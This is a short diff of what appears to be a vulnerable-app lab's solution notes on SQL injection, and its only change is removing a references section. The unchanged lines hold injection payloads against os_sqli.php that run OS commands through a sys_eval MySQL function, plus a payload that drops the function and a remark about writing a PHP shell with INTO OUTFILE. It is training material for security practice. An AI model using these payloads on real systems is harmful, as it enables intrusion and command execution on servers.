@@ -89,8 +89,3 @@ User input is stored and reused as is in a different function that has no protec
 - `os_sqli.php?user=qqqq' union select 1,sys_eval('id'),3,4,5 -- //`
 - To drop the function and redo the exercise run `os_sqli.php?user=qqqq';drop function sys_eval;`
 - As the MySQL instance is running in a separate container than the web application, the `INTO OUTFILE` way of writing a php shell to disk will not work as the shell will be written inside the MySQL container can cannot be accessed from the web application.
-
-## References
-
-- SQL Injection Cheat Sheet - http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
-- Various ways of loading a UDF into MySQL - https://osandamalith.com/2018/02/11/mysql-udf-exploitation/
